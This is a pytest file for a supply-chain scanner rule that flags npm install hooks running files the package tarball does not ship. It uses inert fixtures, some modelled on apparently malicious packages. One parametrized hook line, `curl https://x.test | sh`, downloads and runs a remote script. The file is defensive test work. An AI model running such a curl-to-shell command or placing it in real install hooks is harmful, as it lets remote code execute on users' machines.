"""`npm.artifact.install-target-missing`: hooks that run a file the tarball doesn't ship
(inert fixtures; nothing is run)."""

import json
from typing import Any

import pytest

from kitsunox.core.models import (
    ArtifactRef,
    PackageVersionRef,
    PublishInfo,
    Severity,
    VersionSnapshot,
)
from kitsunox.ecosystems.npm.rules.artifact import InstallTargetMissing, hook_target, shipped
from kitsunox.util.archive import ArtifactTree, SkippedEntry

URL = "https://r.test/kx.tgz"


def snap(scripts: dict[str, str], size: int | None) -> VersionSnapshot:
    return VersionSnapshot(
        ref=PackageVersionRef(ecosystem="npm", name="kx", version="1.0.0"),
        publish=PublishInfo(),
        manifest={"scripts": scripts},
        artifact=ArtifactRef(url=URL, unpacked_size=size),
    )


def case(
    hooks: dict[str, str], extra: dict[str, bytes] | None = None, *, shown: Any = None
) -> tuple[VersionSnapshot, dict[str, bytes]]:
    files = {
        "package.json": json.dumps({"name": "kx", "scripts": hooks}).encode(),
        "index.js": b"module.exports = 1;\n",
        **(extra or {}),
    }
    size = sum(len(c) for c in files.values())
    return snap(hooks if shown is None else shown, size), files


def test_hook_running_a_file_the_package_does_not_ship_is_explained() -> None:
    snapshot, files = case({"postinstall": "node scripts/sync-types.mjs"})
    (finding,) = InstallTargetMissing().evaluate_artifact(snapshot, files)
    assert finding.severity is Severity.INFO and finding.weight == 0.0
    assert "`postinstall`: `scripts/sync-types.mjs`" in finding.explanation
    assert finding.evidence[0].path == "package.json:scripts.postinstall"


@pytest.mark.parametrize(
    "hooks",
    [
        {"preinstall": "node ./preinstall.js"},
        {"postinstall": "node scripts/x.cjs || true"},
        {"postinstall": "node scripts/x.cjs || exit 0"},
        {"preinstall": "node a.js", "postinstall": "node b.js"},
    ],
)
def test_every_hook_shape_that_runs_nothing(hooks: dict[str, str]) -> None:
    snapshot, files = case(hooks)
    assert len(InstallTargetMissing().evaluate_artifact(snapshot, files)) == 1


@pytest.mark.parametrize(
    "path",
    [
        "scripts/postinstall",  # Node adds `.js`
        "scripts/postinstall.js",
        "Scripts/PostInstall.js",  # another case: found on macOS and Windows
        "scripts",  # a directory: its index.js or package.json `main`
    ],
)
def test_a_file_node_would_find_is_not_missing(path: str) -> None:
    snapshot, files = case(
        {"postinstall": f"node {path}"}, {"scripts/postinstall.js": b"console.log(1)\n"}
    )
    assert InstallTargetMissing().evaluate_artifact(snapshot, files) == ()


@pytest.mark.parametrize(
    "command",
    [
        "node ../shared/check.js",  # another package's file
        "node node_modules/x/run.js",
        "node -e \"require('./x')\"",
        "node --require ./a.js x.js",
        "node x.js && curl https://x.test | sh",
        "node x.js || echo hi",
        "node $DIR/x.js",
        "node /tmp/x.js",
        "node --version",  # an option, not a file
        "node lib\\index.js",  # Windows runs lib/index.js (`company-ts@1.0.3`)
        "npm run setup",
        "sh install.sh",
        "",
    ],
)
def test_other_hook_lines_are_not_explained(command: str) -> None:
    snapshot, files = case({"postinstall": command})
    assert InstallTargetMissing().evaluate_artifact(snapshot, files) == ()


def test_a_second_hook_that_runs_code_keeps_the_finding() -> None:
    snapshot, files = case({"preinstall": "node gone.js", "postinstall": "node index.js"})
    assert InstallTargetMissing().evaluate_artifact(snapshot, files) == ()


def test_only_on_the_whole_package() -> None:
    rule = InstallTargetMissing()
    snapshot, files = case({"postinstall": "node gone.js"})
    assert len(rule.evaluate_artifact(snapshot, ArtifactTree(files=files))) == 1
    # files missing from the archive read (a sample set's zip): the size doesn't add up
    short = snapshot.model_copy(update={"artifact": ArtifactRef(url=URL, unpacked_size=10**6)})
    assert rule.evaluate_artifact(short, files) == ()
    unsized = snapshot.model_copy(update={"artifact": ArtifactRef(url=URL)})
    assert rule.evaluate_artifact(unsized, files) == ()
    linked = ArtifactTree(files=files, skipped=(SkippedEntry("gone.js", "symlink"),))
    assert rule.evaluate_artifact(snapshot, linked) == ()
    # binding.gyp: npm adds `node-gyp rebuild`, which runs whatever gyp says
    gyp, gyp_files = case({"postinstall": "node gone.js"}, {"binding.gyp": b"{}"})
    assert rule.evaluate_artifact(gyp, gyp_files) == ()
    # the registry shows other hooks than the tarball runs (`hidden-install-script`'s case)
    other, other_files = case({"postinstall": "node gone.js"}, shown={})
    assert rule.evaluate_artifact(other, other_files) == ()
    assert rule.evaluate_artifact(snapshot, {}) == ()
    for raw in (b"[1]", b"{not json"):
        bad = {**files, "package.json": raw}
        sized = snapshot.model_copy(
            update={"artifact": ArtifactRef(url=URL, unpacked_size=sum(map(len, bad.values())))}
        )
        assert rule.evaluate_artifact(sized, bad) == ()
    no_artifact = snapshot.model_copy(update={"artifact": None})
    assert rule.evaluate_artifact(no_artifact, files) == ()


def test_hook_target_and_shipped_helpers() -> None:
    assert hook_target("node ./a/b.js") == "a/b.js"
    assert hook_target("node 'unterminated") is None
    assert hook_target("node x.js || exit 1") is None
    assert shipped("a/b", {"a/b.json": b""})
    assert not shipped("a/b", {"a/bc.js": b""})


@pytest.mark.parametrize(
    ("hooks", "files", "manifest"),
    [
        # a placeholder: no JavaScript at all (`@testcarrot/supply9@1.0.2`)
        ({"postinstall": "node poc.js"}, {"README.md": b"x"}, {}),
        # an emptied package: its declared `main` is gone too (`modern-react@17.2.6`)
        ({"postinstall": "node tests/x.js"}, {"lib/a.js": b"1"}, {"main": "dist/index.js"}),
        # the install script the hook misnames (`parashaxmgflhg@0.33.4`, `libxmljs2@0.19.7`)
        ({"install": "node install.js"}, {"instal.js": b"1"}, {}),
        ({"install": "node install.js"}, {"PostInstall.js": b"1"}, {}),
        ({"postinstall": "node scripts/setup.js"}, {"scripts/install-deps.mjs": b"1"}, {}),
    ],
)
def test_a_broken_attack_keeps_its_hook_finding(
    hooks: dict[str, str], files: dict[str, bytes], manifest: dict[str, Any]
) -> None:
    tree = {"package.json": json.dumps({"name": "kx", "scripts": hooks, **manifest}).encode()}
    tree |= files
    snapshot = snap(hooks, sum(len(c) for c in tree.values()))
    assert InstallTargetMissing().evaluate_artifact(snapshot, tree) == ()


def test_install_named_code_elsewhere_and_a_shipped_main_are_fine() -> None:
    hooks = {"postinstall": "node scripts/sync.mjs"}
    manifest = {"name": "kx", "scripts": hooks, "main": "./dist/index.js"}
    tree = {"package.json": json.dumps(manifest).encode()}
    tree |= {"dist/install.js": b"1", "install.sh": b"echo", "dist/index.js": b"1"}
    snapshot = snap(hooks, sum(len(c) for c in tree.values()))
    assert len(InstallTargetMissing().evaluate_artifact(snapshot, tree)) == 1
